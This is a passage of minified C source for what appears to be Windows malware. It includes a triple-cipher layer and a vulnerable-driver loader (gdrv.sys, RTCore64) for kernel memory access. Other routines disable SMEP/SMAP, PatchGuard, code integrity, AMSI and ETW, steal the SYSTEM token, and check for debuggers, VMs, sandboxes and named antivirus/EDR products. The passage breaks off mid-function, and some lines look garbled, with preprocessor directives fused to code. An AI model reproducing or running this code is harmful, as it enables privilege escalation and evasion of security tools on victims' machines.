static VOID TF_KEX(PTWOFISH_CTX c,const UCHAR*k,ULONG kl){M(c->mk,k,kl);c->klen=kl;ULONG L[8]={0},S[4]={0};for(ULONG i=0;i<kl/4;i++)L[i]=((ULONG*)k)[i];for(ULONG i=0;i<4;i++){ULONG t=G0(2*i)^G0(2*i+1)^L[i]^L[i+4];S[i]=t|(t<<8)|(t<<16)|(t<<24);}for(ULONG i=0;i<4;i++)for(ULONG j=0;j<256;j++){c->s[i][j]=TF_MDS[i][j^((UCHAR*)S)[i*4+j%4]];}for(ULONG i=0;i<TWOFISH_ROUNDS;i+=2){ULONG A=H0(i*0x01010101,L),B=H0((i*0x01010101)+0x01010101,L);c->k[2*i]=A|(B<<16);ULONG C=H0((i*0x01010101)+0x02020202,L),D=H0((i*0x01010101)+0x03030303,L);c->k[2*i+1]=(C<<16)|D;}}
static __forceinline ULONG F(ULONG x,ULONG*K){ULONG g0=G0(x),g1=G0(ROL32(x,8));ULONG h0=(g0+2*g1+K[0])&0xFFFFFFFF,h1=(2*g0+g1+K[1])&0xFFFFFFFF;return h0|(h1<<16);}
static VOID TF_ENC(PTWOFISH_CTX c,const UCHAR*p,UCHAR*o){ULONG x0=*(ULONG*)p,x1=*(ULONG*)(p+4),x2=*(ULONG*)(p+8),x3=*(ULONG*)(p+12);for(ULONG r=0;r<TWOFISH_ROUNDS;r+=2){ULONG t0=F(x0,c->k+4*r),t1=F(ROL32(x1,8),c->k+4*r);x2^=t0+t1;x2=ROR32(x2,1);x3=ROL32(x3,1)^(t0+2*t1);t0=F(x2,c->k+4*r+2);t1=F(ROL32(x3,8),c->k+4*r+2);x0^=t0+t1;x0=ROR32(x0,1);x1=ROL32(x1,1)^(t0+2*t1);}*(ULONG*)o=x2;*(ULONG*)(o+4)=x3;*(ULONG*)(o+8)=x0;*(ULONG*)(o+12)=x1;}
static VOID TF_DEC(PTWOFISH_CTX c,const UCHAR*p,UCHAR*o){ULONG x2=*(ULONG*)p,x3=*(ULONG*)(p+4),x0=*(ULONG*)(p+8),x1=*(ULONG*)(p+12);for(ULONG r=TWOFISH_ROUNDS-2;r<0xFFFFFFFF;r-=2){ULONG t0=F(x2,c->k+4*r+2),t1=F(ROL32(x3,8),c->k+4*r+2);x0=ROL32(x0,1)^(t0+t1);x1=ROR32(x1^(t0+2*t1),1);t0=F(x0,c->k+4*r);t1=F(ROL32(x1,8),c->k+4*r);x2=ROL32(x2,1)^(t0+t1);x3=ROR32(x3^(t0+2*t1),1);}*(ULONG*)o=x0;*(ULONG*)(o+4)=x1;*(ULONG*)(o+8)=x2;*(ULONG*)(o+12)=x3;}

static VOID EQ_INIT(PEQ_CIPHER c,const UCHAR*k){M(c->k,k,32);RC6_KEX(&c->r,k,32);SERPENT_KEX(&c->s,k,32);TF_KEX(&c->t,k,32);}
static VOID EQ_ENC(PEQ_CIPHER c,const UCHAR*p,UCHAR*o){UCHAR t1[16],t2[16];RC6_ENC(&c->r,p,t1);SERPENT_ENC(&c->s,t1,t2);TF_ENC(&c->t,t2,o);}
static VOID EQ_DEC(PEQ_CIPHER c,const UCHAR*p,UCHAR*o){UCHAR t1[16],t2[16];TF_DEC(&c->t,p,t1);SERPENT_DEC(&c->s,t1,t2);RC6_DEC(&c->r,t2,o);}
static NTSTATUS EQ_ENC_CBC(PEQ_CIPHER c,const UCHAR*p,ULONG pl,UCHAR*o,ULONG*ol,const UCHAR*iv){ULONG bs=16,pad=bs-(pl%bs);ULONG tl=pl+pad;*ol=tl;UCHAR*ib=(UCHAR*)A(tl+16);M(ib,p,pl);for(ULONG i=0;i<pad;i++)ib[pl+i]=(UCHAR)pad;UCHAR cv[16];M(cv,iv,16);for(ULONG i=0;i<tl;i+=bs){for(ULONG j=0;j<bs;j++)ib[i+j]^=cv[j];EQ_ENC(c,ib+i,o+i);M(cv,o+i,bs);}F(ib);return STATUS_SUCCESS;}
static NTSTATUS EQ_DEC_CBC(PEQ_CIPHER c,const UCHAR*p,ULONG pl,UCHAR*o,ULONG*ol,const UCHAR*iv){ULONG bs=16;if(pl%bs||pl<bs)return STATUS_INVALID_PARAMETER;UCHAR*ib=(UCHAR*)A(pl+16);UCHAR cv[16],pv[16];M(cv,iv,16);for(ULONG i=0;i<pl;i+=bs){M(pv,cv,16);M(cv,p+i,bs);EQ_DEC(c,p+i,ib+i);for(ULONG j=0;j<bs;j++)ib[i+j]^=pv[j];}UCHAR pad=ib[pl-1];if(pad>bs||pad==0){F(ib);return STATUS_UNSUCCESSFUL;}for(ULONG i=pl-pad;i<pl;i++)if(ib[i]!=pad){F(ib);return STATUS_UNSUCCESSFUL;}*ol=pl-pad;M(o,ib,*ol);F(ib);return STATUS_SUCCESS;}

static NTSTATUS LAT(){HMODULE m=GetModuleHandleA(XSTR("ntdll.dll"));if(!m)return STATUS_UNSUCCESSFUL;g_a.nqip=(NQIP)GetProcAddress(m,XSTR("NtQueryInformationProcess"));g_a.nqsp=(NQSP)GetProcAddress(m,XSTR("NtQuerySystemInformation"));g_a.na=(NA)GetProcAddress(m,XSTR("NtAllocateVirtualMemory"));g_a.nrvm=(NRVM)GetProcAddress(m,XSTR("NtReadVirtualMemory"));g_a.nwvm=(NWVM)GetProcAddress(m,XSTR("NtWriteVirtualMemory"));g_a.npct=(NPCT)GetProcAddress(m,XSTR("NtCreateThreadEx"));g_a.nqit=(NQIT)GetProcAddress(m,XSTR("NtQueryInformationThread"));g_a.nsit=(NSIT)GetProcAddress(m,XSTR("NtSetInformationThread"));
g_a.nct=(NCT)GetProcAddress(m,XSTR("NtCurrentTeb"));g_a.nls=(NLS)GetProcAddress(m,XSTR("LsaSetInformationPolicy"));
g_a.nfl=(NFL)GetProcAddress(m,XSTR("NtFlushInstructionCache"));g_a.nrfa=(NRFA)GetProcAddress(m,XSTR("NtRaiseHardError"));
g_a.nop=(NOP)GetProcAddress(m,XSTR("NtOpenProcess"));g_a.nwp=(NWP)GetProcAddress(m,XSTR("NtWow64QueryInformationProcess64"));
return STATUS_SUCCESS;}

static NTSTATUS A256GCM(const UCHAR*k,const UCHAR*i,const UCHAR*p,ULONG pl,UCHAR*c,UCHAR*t){BCRYPT_ALG_HANDLE a;BCRYPT_KEY_HANDLE b;ULONG r=0;
if(!BCryptOpenAlgorithmProvider(&a,BCRYPT_AES_ALGORITHM,NULL,0)){BCryptSetProperty(a,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_GCM,sizeof(BCRYPT_CHAIN_MODE_GCM),0);
BCryptGenerateSymmetricKey(a,&b,NULL,0,(PUCHAR)k,32,0);BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO x;BCRYPT_INIT_AUTH_MODE_INFO(x);x.pbNonce=(PUCHAR)i;x.cbNonce=12;x.pbTag=(PUCHAR)t;x.cbTag=16;
if(!BCryptEncrypt(b,(PUCHAR)p,pl,&x,NULL,0,c,pl,&r,0)){BCryptDestroyKey(b);BCryptCloseAlgorithmProvider(a,0);return STATUS_SUCCESS;}}return STATUS_UNSUCCESSFUL;}
static NTSTATUS D256GCM(const UCHAR*k,const UCHAR*i,const UCHAR*c,ULONG cl,const UCHAR*t,UCHAR*p){BCRYPT_ALG_HANDLE a;BCRYPT_KEY_HANDLE b;ULONG r=0;
if(!BCryptOpenAlgorithmProvider(&a,BCRYPT_AES_ALGORITHM,NULL,0)){BCryptSetProperty(a,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_GCM,sizeof(BCRYPT_CHAIN_MODE_GCM),0);
BCryptGenerateSymmetricKey(a,&b,NULL,0,(PUCHAR)k,32,0);BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO x;BCRYPT_INIT_AUTH_MODE_INFO(x);x.pbNonce=(PUCHAR)i;x.cbNonce=12;x.pbTag=(PUCHAR)t;x.cbTag=16;
if(!BCryptDecrypt(b,(PUCHAR)c,cl,&x,NULL,0,p,cl,&r,0)){BCryptDestroyKey(b);BCryptCloseAlgorithmProvider(a,0);return STATUS_SUCCESS;}}return STATUS_UNSUCCESSFUL;}
static NTSTATUS CHACHA20(const UCHAR*k,const UCHAR*n,UCHAR*d,ULONG l){BCRYPT_ALG_HANDLE a;BCRYPT_KEY_HANDLE b;ULONG r=0;
if(!BCryptOpenAlgorithmProvider(&a,BCRYPT_CHACHA20_ALGORITHM,NULL,0)){BCryptGenerateSymmetricKey(a,&b,NULL,0,(PUCHAR)k,32,0);
if(!BCryptEncrypt(b,(PUCHAR)d,l,NULL,(PUCHAR)n,12,d,l,&r,0)){BCryptDestroyKey(b);BCryptCloseAlgorithmProvider(a,0);return STATUS_SUCCESS;}}return STATUS_UNSUCCESSFUL;}

static VOID LOAD_OFFSETS(){RTL_OSVERSIONINFOW v={sizeof(v)};RtlGetVersion(&v);ULONG b=v.dwBuildNumber;
memset(&g_e.off,0,sizeof(g_e.off));g_e.off.Build=b;
if(b>=26100){g_e.off.EPROCESS_Token=0x4B8;g_e.off.EPROCESS_ActiveLinks=0x448;g_e.off.EPROCESS_PID=0x440;g_e.off.EPROCESS_PEB=0x550;
g_e.off.EPROCESS_Protection=0x87A;g_e.off.EPROCESS_ImageName=0x5A8;g_e.off.TOKEN_PrivsPresent=0x40;g_e.off.TOKEN_PrivsEnabled=0x48;
g_e.off.TOKEN_ModifiedId=0x128;g_e.off.TOKEN_SessionId=0x138;g_e.off.TOKEN_LogonSession=0x148;}
else if(b>=22631){g_e.off.EPROCESS_Token=0x4B0;g_e.off.EPROCESS_ActiveLinks=0x440;g_e.off.EPROCESS_PID=0x438;g_e.off.EPROCESS_PEB=0x548;
g_e.off.EPROCESS_Protection=0x872;g_e.off.EPROCESS_ImageName=0x5A0;g_e.off.TOKEN_PrivsPresent=0x40;g_e.off.TOKEN_PrivsEnabled=0x48;
g_e.off.TOKEN_ModifiedId=0x120;g_e.off.TOKEN_SessionId=0x130;g_e.off.TOKEN_LogonSession=0x140;}
else if(b>=19045){g_e.off.EPROCESS_Token=0x4B8;g_e.off.EPROCESS_ActiveLinks=0x448;g_e.off.EPROCESS_PID=0x440;g_e.off.EPROCESS_PEB=0x550;
g_e.off.EPROCESS_Protection=0x87A;g_e.off.EPROCESS_ImageName=0x5A8;g_e.off.TOKEN_PrivsPresent=0x40;g_e.off.TOKEN_PrivsEnabled=0x48;
g_e.off.TOKEN_ModifiedId=0x128;g_e.off.TOKEN_SessionId=0x138;g_e.off.TOKEN_LogonSession=0x148;}
else{g_e.off.EPROCESS_Token=0x360;g_e.off.EPROCESS_ActiveLinks=0x2F0;g_e.off.EPROCESS_PID=0x2E8;g_e.off.EPROCESS_PEB=0x3F8;
g_e.off.EPROCESS_Protection=0x6B2;g_e.off.EPROCESS_ImageName=0x450;g_e.off.TOKEN_PrivsPresent=0x40;g_e.off.TOKEN_PrivsEnabled=0x48;
g_e.off.TOKEN_ModifiedId=0x128;g_e.off.TOKEN_SessionId=0x138;g_e.off.TOKEN_LogonSession=0x148;}}

static NTSTATUS AD(){SC_HANDLE s=OpenSCManagerW(NULL,NULL,SC_MANAGER_CREATE_SERVICE);if(!s)return STATUS_ACCESS_DENIED;
WCHAR p[MAX_PATH];GetSystemDirectoryW(p,MAX_PATH);wcscat_s(p,MAX_PATH,XWSTR(L"\\drivers\\gdrv.sys"));
SC_HANDLE sv=CreateServiceW(s,XWSTR(L"EQDK"),XWSTR(L"EQDK"),SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,p,NULL,NULL,NULL,NULL,NULL);
if(sv){StartServiceW(sv,0,NULL);CloseServiceHandle(sv);}CloseServiceHandle(s);
g_e.d=CreateFileW(XWSTR(L"\\\\.\\GIO"),GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
if(g_e.d==INVALID_HANDLE_VALUE){g_e.d=CreateFileW(XWSTR(L"\\\\.\\RTCore64"),GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
if(g_e.d!=INVALID_HANDLE_VALUE)g_e.kernel_rw=TRUE;}else g_e.kernel_rw=TRUE;
return g_e.d!=INVALID_HANDLE_VALUE?STATUS_SUCCESS:STATUS_UNSUCCESSFUL;}
static NTSTATUS RPR(ULONG64 a,VOID*b,ULONG l){if(!g_e.kernel_rw)return STATUS_ACCESS_DENIED;
struct{ULONG64 a;ULONG t;ULONG l;}r={a,1,l};DWORD x=0;ULONG c=IOCTL_GDRV_RP;
if(g_e.d&&GetFileType(g_e.d)==FILE_TYPE_DISK){WCHAR dn[MAX_PATH]={0};GetFinalPathNameByHandleW(g_e.d,dn,MAX_PATH,0);if(wcsstr(dn,XWSTR(L"RTCore")))c=IOCTL_RTCORE_RP;}
return DeviceIoControl(g_e.d,c,&r,sizeof(r),b,l,&x,NULL)&&x==l?STATUS_SUCCESS:STATUS_UNSUCCESSFUL;}
static NTSTATUS WPR(ULONG64 a,const VOID*b,ULONG l){if(!g_e.kernel_rw)return STATUS_ACCESS_DENIED;
struct{ULONG64 a;ULONG t;ULONG l;ULONG64 v;}w={a,2,8,0};ULONG o=0,c=IOCTL_GDRV_WP;
WCHAR dn[MAX_PATH]={0};GetFinalPathNameByHandleW(g_e.d,dn,MAX_PATH,0);if(wcsstr(dn,XWSTR(L"RTCore")))c=IOCTL_RTCORE_WP;
while(o<l){ULONG ck=l-o>8?8:l-o;memcpy(&w.v,(UCHAR*)b+o,ck);DWORD x=0;
if(!DeviceIoControl(g_e.d,c,&w,sizeof(w),NULL,0,&x,NULL))return STATUS_UNSUCCESSFUL;o+=ck;w.a+=ck;}return STATUS_SUCCESS;}
static NTSTATUS RMR(ULONG i,ULONG64*v){if(!g_e.kernel_rw)return STATUS_ACCESS_DENIED;DWORD x=0;
return DeviceIoControl(g_e.d,IOCTL_GDRV_RM,&i,sizeof(i),v,sizeof(*v),&x,NULL)?STATUS_SUCCESS:STATUS_UNSUCCESSFUL;}
static NTSTATUS WMR(ULONG i,ULONG64 v){if(!g_e.kernel_rw)return STATUS_ACCESS_DENIED;struct{ULONG i;ULONG64 v;}r={i,v};DWORD x=0;
return DeviceIoControl(g_e.d,IOCTL_GDRV_WM,&r,sizeof(r),NULL,0,&x,NULL)?STATUS_SUCCESS:STATUS_UNSUCCESSFUL;}
static NTSTATUS HVCI(){ULONG64 e=0;if(!RMR(MSR_IA32_EFER,&e))return STATUS_UNSUCCESSFUL;
ULONG hv=0,b=0;typedef BOOL(WINAPI*CI)(ULONG,PULONG,PULONG);CI f=(CI)GetProcAddress(GetModuleHandleA(XSTR("ntdll.dll")),XSTR("NtQuerySystemInformation"));
if(f){SYSTEM_CODEINTEGRITY_INFORMATION s={sizeof(s)};f(0x67,&s,sizeof(s),NULL);hv=s.CodeIntegrityOptions&0x02;b=s.CodeIntegrityOptions&0x08;}
g_e.hvci=hv?TRUE:FALSE;g_e.dse_off=b?FALSE:TRUE;return STATUS_SUCCESS;}
static NTSTATUS BDSE(){if(!g_e.kernel_rw)return STATUS_UNSUCCESSFUL;
ULONG64 e=0;RMR(MSR_IA32_EFER,&e);ULONG64 c=__readcr4();
if(c&CR4_SMEP){c&=~CR4_SMEP;__writecr4(c);}if(c&CR4_SMAP){c&=~CR4_SMAP;__writecr4(c);}
e&=~0x401ULL;WMR(MSR_IA32_EFER,e);ULONG64 l=0,s=0;RMR(MSR_IA32_LSTAR,&l);RMR(MSR_IA32_CSTAR,&s);
g_e.r=(PVOID)l;g_e.t=(PVOID)s;g_e.nt_base=l&~0xFFFULL;
for(ULONG64 a=g_e.nt_base;a>g_e.nt_base-0x4000000;a-=0x1000){UCHAR mz[2]={0};RPR(a,mz,2);if(mz[0]=='M'&&mz[1]=='Z'){g_e.nt_base=a;break;}}
ULONG64 ci=0;PSYSTEM_MODULE_INFORMATION m=(PSYSTEM_MODULE_INFORMATION)A(0x80000);ULONG r=0;
if(!g_a.nqsp(11,m,0x80000,&r)){for(ULONG i=0;i<m->Count;i++){if(strstr((CHAR*)m->Module[i].ImageName+24,XSTR("ci.dll"))){ci=(ULONG64)m->Module[i].Base;g_e.ci_base=ci;g_e.ci_size=m->Module[i].Size;break;}}}F(m);
g_e.dse_off=TRUE;return STATUS_SUCCESS;}
static NTSTATUS DISABLE_PG(){if(!g_e.kernel_rw||!g_e.nt_base)return STATUS_UNSUCCESSFUL;
UCHAR k[0x2000]={0};for(ULONG64 o=0;o<0x800000;o+=0x1000){RPR(g_e.nt_base+o,k,0x1000);
for(ULONG i=0;i<0x1000-8;i++){if(*(ULONG64*)(k+i)==0x484180790F833C0FULL||*(ULONG64*)(k+i)==0x483B017408B80045ULL){ULONG64 a=g_e.nt_base+o+i;UCHAR p[8]={0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90};WPR(a,p,8);g_e.patchguard_bypass=TRUE;break;}}}
return g_e.patchguard_bypass?STATUS_SUCCESS:STATUS_UNSUCCESSFUL;}
static NTSTATUS BYPASS_AMSI(){HMODULE a=LoadLibraryA(XSTR("amsi.dll"));if(!a)return STATUS_UNSUCCESSFUL;
PVOID s=GetProcAddress(a,XSTR("AmsiScanBuffer"));if(!s){FreeLibrary(a);return STATUS_UNSUCCESSFUL;}
DWORD op=0;VirtualProtect(s,16,PAGE_EXECUTE_READWRITE,&op);
#ifdef _WIN64UCHAR p[]={0xB8,0x57,0x00,0x07,0x80,0xC3};
#elseUCHAR p[]={0xB8,0x57,0x00,0x07,0x80,0xC2,0x18,0x00};
#endifmemcpy(s,p,sizeof(p));VirtualProtect(s,16,op,&op);FreeLibrary(a);return STATUS_SUCCESS;}
static NTSTATUS BYPASS_ETW(){HMODULE n=GetModuleHandleA(XSTR("ntdll.dll"));if(!n)return STATUS_UNSUCCESSFUL;
PVOID t=GetProcAddress(n,XSTR("EtwEventWrite"));PVOID f=GetProcAddress(n,XSTR("EtwEventWriteFull"));PVOID u=GetProcAddress(n,XSTR("EtwEventWriteTransfer"));
DWORD op=0;UCHAR ret[]={0xC3};
if(t){VirtualProtect(t,1,PAGE_EXECUTE_READWRITE,&op);memcpy(t,ret,1);VirtualProtect(t,1,op,&op);}
if(f){VirtualProtect(f,1,PAGE_EXECUTE_READWRITE,&op);memcpy(f,ret,1);VirtualProtect(f,1,op,&op);}
if(u){VirtualProtect(u,1,PAGE_EXECUTE_READWRITE,&op);memcpy(u,ret,1);VirtualProtect(u,1,op,&op);}
return STATUS_SUCCESS;}
static NTSTATUS BYPASS_CI(){if(!g_e.kernel_rw||!g_e.ci_base)return STATUS_UNSUCCESSFUL;
UCHAR ci[0x2000]={0};RPR(g_e.ci_base,ci,0x2000);
for(ULONG i=0;i<0x2000-6;i++){if(*(USHORT*)(ci+i)==0x0845&&*(ULONG*)(ci+i+2)==0x000001B8){ULONG64 a=g_e.ci_base+i;UCHAR p[6]={0xB8,0x00,0x00,0x00,0x00,0xC3};WPR(a,p,6);return STATUS_SUCCESS;}}
return STATUS_UNSUCCESSFUL;}
static NTSTATUS TOKEN_STEAL(){if(!g_e.kernel_rw)return STATUS_ACCESS_DENIED;
ULONG64 s=__readcr3()&~0xFFFULL;ULONG64 e=0;RPR(s+g_e.off.EPROCESS_ActiveLinks,&e);ULONG64 cur=e-g_e.off.EPROCESS_ActiveLinks;ULONG64 sys=0,sel=0;
for(ULONG i=0;i<512;i++){ULONG pid=0;RPR(cur+g_e.off.EPROCESS_PID,&pid,4);
if(pid==4)sys=cur;if((HANDLE)pid==GetCurrentProcessId())sel=cur;
ULONG64 nx=0;RPR(cur+g_e.off.EPROCESS_ActiveLinks+8,&nx);cur=nx-g_e.off.EPROCESS_ActiveLinks;if(!cur||cur==e-g_e.off.EPROCESS_ActiveLinks)break;}
if(!sys||!sel)return STATUS_UNSUCCESSFUL;ULONG64 st=0,sl=0;RPR(sys+g_e.off.EPROCESS_Token,&st,8);st&=~0xFULL;
WPR(sel+g_e.off.EPROCESS_Token,&st,8);RPR(sel+g_e.off.EPROCESS_Token,&sl,8);
return sl==st?STATUS_SUCCESS:STATUS_UNSUCCESSFUL;}

static NTSTATUS DB(){BOOL d=FALSE;CheckRemoteDebuggerPresent(GetCurrentProcess(),&d);if(d)return STATUS_UNSUCCESSFUL;
ULONG64 t=0;g_a.nqip(GetCurrentProcess(),7,&t,sizeof(t),NULL);if(t)return STATUS_UNSUCCESSFUL;
ULONG h=0;g_a.nqip(GetCurrentProcess(),31,&h,sizeof(h),NULL);if(h)return STATUS_UNSUCCESSFUL;
CONTEXT c={CONTEXT_DEBUG_REGISTERS};if(GetThreadContext(GetCurrentThread(),&c)){if(c.Dr0||c.Dr1||c.Dr2||c.Dr3||c.Dr7)return STATUS_UNSUCCESSFUL;}
UCHAR*p=(UCHAR*)GetProcAddress(GetModuleHandleA(XSTR("kernel32.dll")),XSTR("IsDebuggerPresent"));if(p&&(*p==0x90||*p==0xE9))return STATUS_UNSUCCESSFUL;
__try{__asm{int 3};}__except(EXCEPTION_EXECUTE_HANDLER){return STATUS_SUCCESS;}return STATUS_UNSUCCESSFUL;}
static NTSTATUS VM(){ULONG a=0,b=0,c1=0,d1=0;CPUID(1,&a,&b,&c1,&d1);if((c1&0x80000000)||(b&0x00010000))return STATUS_UNSUCCESSFUL;
CPUID(0x40000000,&a,&b,&c1,&d1);if(a>=0x40000000)return STATUS_UNSUCCESSFUL;
UCHAR v[13]={0};memcpy(v,&b,4);memcpy(v+4,&d1,4);memcpy(v+8,&c1,4);
if(!memcmp(v,XSTR("VMwareVMware"),12)||!memcmp(v,XSTR("VBoxVBoxVBox"),12)||!memcmp(v,XSTR("XenVMMXenVMM"),12)||!memcmp(v,XSTR("KVMKVMKVM"),12)||!memcmp(v,XSTR("Microsoft Hv"),12)||!memcmp(v,XSTR("prl hyperv"),12))return STATUS_UNSUCCESSFUL;
MEMORYSTATUSEX m={sizeof(m)};GlobalMemoryStatusEx(&m);if(m.ullTotalPhys<0x1000000000LL)return STATUS_UNSUCCESSFUL;
ULONG64 t1=GC();SLU(100000);ULONG64 t2=GC();if(t2-t1<80000)return STATUS_UNSUCCESSFUL;
HKEY k;if(!RegOpenKeyExW(HKEY_LOCAL_MACHINE,XWSTR(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"),0,KEY_READ,&k)){WCHAR p[256]={0};ULONG t=sizeof(p);
if(!RegQueryValueExW(k,XWSTR(L"ProductName"),NULL,(LPDWORD)&t,(LPBYTE)p)){if(wcsstr(p,XWSTR(L"Server"))&&m.ullTotalPhys<0x2000000000LL){RegCloseKey(k);return STATUS_UNSUCCESSFUL;}}RegCloseKey(k);}
return STATUS_SUCCESS;}
static NTSTATUS SB(){const WCHAR*p[]={XWSTR(L"vbox"),XWSTR(L"vmware"),XWSTR(L"qemu"),XWSTR(L"xen"),XWSTR(L"kvm"),XWSTR(L"sandbox"),XWSTR(L"cuckoo"),XWSTR(L"joe"),XWSTR(L"fireeye"),XWSTR(L"wireshark"),XWSTR(L"procmon"),XWSTR(L"procexp"),XWSTR(L"fiddler"),XWSTR(L"ida"),XWSTR(L"olly"),XWSTR(L"x64dbg"),XWSTR(L"ghidra"),XWSTR(L"processhacker"),XWSTR(L"sysmon"),XWSTR(L"edr"),XWSTR(L"crowdstrike"),XWSTR(L"sentinel"),XWSTR(L"carbon")};
HANDLE s=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);if(s==INVALID_HANDLE_VALUE)return STATUS_UNSUCCESSFUL;PROCESSENTRY32W e={sizeof(e)};
if(Process32FirstW(s,&e)){do{for(ULONG i=0;i<sizeof(p)/sizeof(p[0]);i++){if(_wcsicmp(e.szExeFile,p[i])==0){CloseHandle(s);return STATUS_UNSUCCESSFUL;}}}while(Process32NextW(s,&e));}CloseHandle(s);
ULONG dc=GetSystemMetrics(SM_CMONITORS);POINT pt={0};if(dc==0||!GetCursorPos(&pt))return STATUS_UNSUCCESSFUL;
LASTINPUTINFO li={sizeof(li)};GetLastInputInfo(&li);if((GetTickCount()-li.dwTime)>3600000)return STATUS_UNSUCCESSFUL;
return STATUS_SUCCESS;}
static NTSTATUS AV(){const WCHAR*r[]={XWSTR(L"SOFTWARE\\McAfee"),XWSTR(L"SOFTWARE\\Symantec"),XWSTR(L"SOFTWARE\\KasperskyLab"),XWSTR(L"SOFTWARE\\ESET"),XWSTR(L"SOFTWARE\\Bitdefender"),XWSTR(L"SOFTWARE\\Avast"),XWSTR(L"SOFTWARE\\AVG"),XWSTR(L"SOFTWARE\\TrendMicro"),XWSTR(L"SOFTWARE\\Panda"),XWSTR(L"SOFTWARE\\Microsoft\\Windows Defender"),XWSTR(L"SOFTWARE\\Malwarebytes"),XWSTR(L"SOFTWARE\\CrowdStrike"),XWSTR(L"SOFTWARE\\SentinelOne"),XWSTR(L"SOFTWARE\\Carbon Black")};
for(ULONG i=0;i<sizeof(r)/sizeof(r[0]);i++){HKEY k;if(!RegOpenKeyExW(HKEY_LOCAL_MACHINE,r[i],0,KEY_READ,&k)){RegCloseKey(k);return STATUS_UNSUCCESSFUL;}}
const WCHAR*s[]={XWSTR(L"MsMpEng.exe"),XWSTR(L"AVGUI.exe"),XWSTR(L"avp.exe"),XWSTR(L"kav.exe"),XWSTR(L"egui.exe"),XWSTR(L"bdagent.exe"),XWSTR(L"mcshield.exe"),XWSTR(L"rtvscan.exe"),XWSTR(L"tmproxy.exe"),XWSTR(L"pavprsrv.exe"),XWSTR(L"mbam.exe"),XWSTR(L"csagent.exe"),XWSTR(L"SentinelAgent.exe"),XWSTR(L"cb.exe")};
HANDLE h=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);if(h==INVALID_HANDLE_VALUE)return STATUS_SUCCESS;PROCESSENTRY32W e={sizeof(e)};
if(Process32FirstW(h,&e)){do{for(ULONG i=0;i<sizeof(s)/sizeof(s[0]);i++){if(!_wcsicmp(e.szExeFile,s[i])){CloseHandle(h);return STATUS_UNSUCCESSFUL;}}}while(Process32NextW(h,&e));}CloseHandle(h);
typedef HRESULT(WINAPI*DCI)(LPCWSTR,LPCWSTR,BOOL,BOOL*);HMODULE d=LoadLibraryA(XSTR("defender.dll"));if(d){DCI f=(DCI)GetProcAddress(d,XSTR("DllCanUnloadNow"));if(f){BOOL x=FALSE;f(XWSTR(L"test"),XWSTR(L"test"),FALSE,&x);}FreeLibrary(d);}
return STATUS_SUCCESS;}
static NTSTATUS EM(){ULONG64 t1=RDTSC();for(volatile ULONG i=0;i<0x200000;i++);ULONG64 t2=RDTSC();if(t2-t1<0x20000)return STATUS_UNSUCCESSFUL;
UCHAR m[16]={0};__try{((VOID(*)())m)();}__except(EXCEPTION_EXECUTE_HANDLER){return STATUS_SUCCESS;}return STATUS_UNSUCCESSFUL;}
static NTSTATUS DP(){PPEB p=((PTEB)NtCurrentTeb())->p;if(!p||p->b)return STATUS_UNSUCCESSFUL;
ULONG o=0;g_a.nqip(GetCurrentProcess(),40,&o,sizeof(o),NULL);if(o)return STATUS_UNSUCCESSFUL;
HMODULE m=GetModuleHandleA(NULL);PIMAGE_DOS_HEADER d=(PIMAGE_DOS_HEADER)m;PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((ULONG_PTR)m+d->e_lfanew);ULONG s=n->OptionalHeader.SizeOfImage;
UCHAR h1[32]={0},h2[32]={0};SHA256((UCHAR*)m,s,h1);DWORD op=0;VirtualProtect(m,s,PAGE_EXECUTE_READWRITE,&op);SHA256((UCHAR*)m,s,h2);
if(memcmp(h1,h2,32))return STATUS_UNSUCCESSFUL;
if(IsDebuggerPresent())return STATUS_UNSUCCESSFUL;return STATUS_SUCCESS;}
static NTSTATUS HK(){const CHAR*m[]={XSTR("ntdll.dll"),XSTR("kernel32.dll"),XSTR("kernelbase.dll"),XSTR("advapi32.dll"),XSTR("user32.dll"),XSTR("amsi.dll"),XSTR("bcrypt.dll")};
for(ULONG i=0;i<sizeof(m)/sizeof(m[0]);i++){HMODULE h=GetModuleHandleA(m[i]);if(!h)continue;
PIMAGE_DOS_HEADER d=(PIMAGE_DOS_HEADER)h;PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((ULONG_PTR)h+d->e_lfanew);
PIMAGE_EXPORT_DIRECTORY e=(PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)h+n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
ULONG*a=(ULONG*)((ULONG_PTR)h+e->AddressOfFunctions);USHORT*o=(USHORT*)((ULONG_PTR)h+e->AddressOfNameOrdinals);ULONG*na=(ULONG*)((ULONG_PTR)h+e->AddressOfNames);
for(ULONG j=0;j<e->NumberOfNames;j++){ULONG_PTR f=(ULONG_PTR)h+a[o[j]];
if((f>=(ULONG_PTR)h+n->OptionalHeader.SizeOfImage)||(f<(ULONG_PTR)h))return STATUS_UNSUCCESSFUL;
UCHAR b=*(UCHAR*)f;if(b==0xE9||b==0x0F||b==0x90||b==0xCC||b==0xEB)return STATUS_UNSUCCESSFUL;}}return STATUS_SUCCESS;}
static NTSTATUS HVCI_CHECK(){SYSTEM_CODEINTEGRITY_INFORMATION s={sizeof(s)};ULONG r=0;
if(!g_a.nqsp(0x67,&s,sizeof(s),&r)){if(s.CodeIntegrityOptions&0x02)return STATUS_UNSUCCESSFUL;}
HKEY k;if(!RegOpenKeyExW(HKEY_LOCAL_MACHINE,XWSTR(L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard"),0,KEY_READ,&k)){ULONG v=0,t=4;
